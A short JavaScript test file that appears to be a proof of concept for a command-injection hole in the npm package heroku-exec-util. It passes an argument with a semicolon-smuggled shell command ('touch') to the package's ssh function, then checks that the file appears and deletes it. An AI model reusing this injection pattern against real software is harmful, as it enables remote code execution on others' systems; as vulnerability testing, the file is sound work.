//
test("Remote code execution in heroku-exec-util", () => {
  const fs = require("fs");
  const heu = require("heroku-exec-util");
  const path = "./heroku-exec-util";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    heu
      .ssh({ args: {} }, "test; touch heroku-exec-util; #", "", "test", {
        path: "test",
      })
      .then(() => {
        ///checking that its created by after exploit.
        file_exist = fs.existsSync(path);
        expect(file_exist).toBe(true);

        fs.unlink(path, function (err) {}); //deleting the file after creation
      });
  } catch (error) {}

  //sleep.sleep(5);
});
